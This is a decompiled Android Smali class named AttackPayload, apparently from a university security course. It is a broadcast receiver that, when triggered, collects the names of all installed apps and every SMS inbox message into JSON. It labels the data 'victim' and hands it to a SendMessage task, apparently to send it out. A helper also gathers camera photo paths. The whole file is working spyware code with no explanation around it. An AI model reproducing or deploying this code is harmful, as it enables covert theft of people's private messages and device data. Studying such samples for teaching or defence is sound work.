.class public Ledu/tufts/cs/security/AttackPayload;
.super Landroid/content/BroadcastReceiver;
.source "AttackPayload.java"


# static fields
.field public static final CAMERA_IMAGE_BUCKET_ID:Ljava/lang/String;

.field public static final CAMERA_IMAGE_BUCKET_NAME:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .registers 2

    .prologue
    .line 21
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 22
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/DCIM/Camera"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Ledu/tufts/cs/security/AttackPayload;->CAMERA_IMAGE_BUCKET_NAME:Ljava/lang/String;

    .line 24
    sget-object v0, Ledu/tufts/cs/security/AttackPayload;->CAMERA_IMAGE_BUCKET_NAME:Ljava/lang/String;

    .line 25
    invoke-static {v0}, Ledu/tufts/cs/security/AttackPayload;->getBucketId(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Ledu/tufts/cs/security/AttackPayload;->CAMERA_IMAGE_BUCKET_ID:Ljava/lang/String;

    .line 24
    return-void
.end method

.method public constructor <init>()V
    .registers 1

    .prologue
    .line 18
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method public static getBucketId(Ljava/lang/String;)Ljava/lang/String;
    .registers 2
    .param p0, "path"    # Ljava/lang/String;

    .prologue
    .line 27
    invoke-virtual {p0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public static getCameraImages(Landroid/content/Context;)Ljava/util/ArrayList;
    .registers 12
    .param p0, "context"    # Landroid/content/Context;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            ")",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    const/4 v3, 0x1

    const/4 v1, 0x0

    .line 31
    new-array v2, v3, [Ljava/lang/String;

    const-string v0, "_data"

    aput-object v0, v2, v1

    .line 32
    .local v2, "projection":[Ljava/lang/String;
    const-string v10, "bucket_id = ?"

    .line 33
    .local v10, "selection":Ljava/lang/String;
    new-array v4, v3, [Ljava/lang/String;

    sget-object v0, Ledu/tufts/cs/security/AttackPayload;->CAMERA_IMAGE_BUCKET_ID:Ljava/lang/String;

    aput-object v0, v4, v1

    .line 34
    .local v4, "selectionArgs":[Ljava/lang/String;
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    sget-object v1, Landroid/provider/MediaStore$Images$Media;->EXTERNAL_CONTENT_URI:Landroid/net/Uri;

    const-string v3, "bucket_id = ?"

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v6

    .line 39
    .local v6, "cursor":Landroid/database/Cursor;
    new-instance v9, Ljava/util/ArrayList;

    invoke-interface {v6}, Landroid/database/Cursor;->getCount()I

    move-result v0

    invoke-direct {v9, v0}, Ljava/util/ArrayList;-><init>(I)V

    .line 40
    .local v9, "result":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    invoke-interface {v6}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v0

    if-eqz v0, :cond_3f

    .line 41
    const-string v0, "_data"

    invoke-interface {v6, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v8

    .line 43
    .local v8, "dataColumn":I
    :cond_32
    invoke-interface {v6, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 44
    .local v7, "data":Ljava/lang/String;
    invoke-virtual {v9, v7}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 46
    invoke-interface {v6}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_32

    .line 48
    .end local v7    # "data":Ljava/lang/String;
    .end local v8    # "dataColumn":I
    :cond_3f
    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    .line 49
    return-object v9
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 18
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 56
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v13

    .line 59
    .local v13, "pm":Landroid/content/pm/PackageManager;
    const/16 v0, 0x80

    invoke-virtual {v13, v0}, Landroid/content/pm/PackageManager;->getInstalledApplications(I)Ljava/util/List;

    move-result-object v12

    .line 61
    .local v12, "packages":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/ApplicationInfo;>;"
    new-instance v7, Lorg/json/JSONArray;

    invoke-direct {v7}, Lorg/json/JSONArray;-><init>()V

    .line 62
    .local v7, "apps":Lorg/json/JSONArray;
    invoke-interface {v12}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_13
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_2f

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Landroid/content/pm/ApplicationInfo;

    .line 63
    .local v11, "packageInfo":Landroid/content/pm/ApplicationInfo;
    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    .line 65
    .local v6, "app":Lorg/json/JSONObject;
    :try_start_24
    const-string v1, "app_name"

    iget-object v2, v11, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v6, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_2b
    .catch Lorg/json/JSONException; {:try_start_24 .. :try_end_2b} :catch_a5
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_2b} :catch_a3

    .line 69
    :goto_2b
    invoke-virtual {v7, v6}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    goto :goto_13

    .line 74
    .end local v6    # "app":Lorg/json/JSONObject;
    .end local v11    # "packageInfo":Landroid/content/pm/ApplicationInfo;
    :cond_2f
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms/inbox"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v8

    .line 75
    .local v8, "cursor":Landroid/database/Cursor;
    invoke-interface {v8}, Landroid/database/Cursor;->moveToFirst()Z

    .line 77
    new-instance v10, Lorg/json/JSONArray;

    invoke-direct {v10}, Lorg/json/JSONArray;-><init>()V

    .line 79
    .local v10, "messages":Lorg/json/JSONArray;
    :cond_49
    new-instance v14, Lorg/json/JSONObject;

    invoke-direct {v14}, Lorg/json/JSONObject;-><init>()V

    .line 80
    .local v14, "sms":Lorg/json/JSONObject;
    const/4 v9, 0x0

    .local v9, "i":I
    :goto_4f
    invoke-interface {v8}, Landroid/database/Cursor;->getColumnCount()I

    move-result v0

    if-ge v9, v0, :cond_63

    .line 82
    :try_start_55
    invoke-interface {v8, v9}, Landroid/database/Cursor;->getColumnName(I)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v8, v9}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v14, v0, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_60
    .catch Lorg/json/JSONException; {:try_start_55 .. :try_end_60} :catch_a1
    .catch Ljava/lang/Exception; {:try_start_55 .. :try_end_60} :catch_9f

    .line 80
    :goto_60
    add-int/lit8 v9, v9, 0x1

    goto :goto_4f

    .line 87
    :cond_63
    invoke-virtual {v10, v14}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 89
    invoke-interface {v8}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_49

    .line 97
    new-instance v0, Ledu/tufts/cs/security/SendMessage;

    invoke-direct {v0}, Ledu/tufts/cs/security/SendMessage;-><init>()V

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "victim"

    aput-object v3, v1, v2

    const/4 v2, 0x1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ";"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v10}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    invoke-virtual {v0, v1}, Ledu/tufts/cs/security/SendMessage;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 98
    return-void

    .line 85
    :catch_9f
    move-exception v0

    goto :goto_60

    .line 84
    :catch_a1
    move-exception v0

    goto :goto_60

    .line 68
    .end local v8    # "cursor":Landroid/database/Cursor;
    .end local v9    # "i":I
    .end local v10    # "messages":Lorg/json/JSONArray;
    .end local v14    # "sms":Lorg/json/JSONObject;
    .restart local v6    # "app":Lorg/json/JSONObject;
    .restart local v11    # "packageInfo":Landroid/content/pm/ApplicationInfo;
    :catch_a3
    move-exception v1

    goto :goto_2b

    .line 67
    :catch_a5
    move-exception v1

    goto :goto_2b
.end method
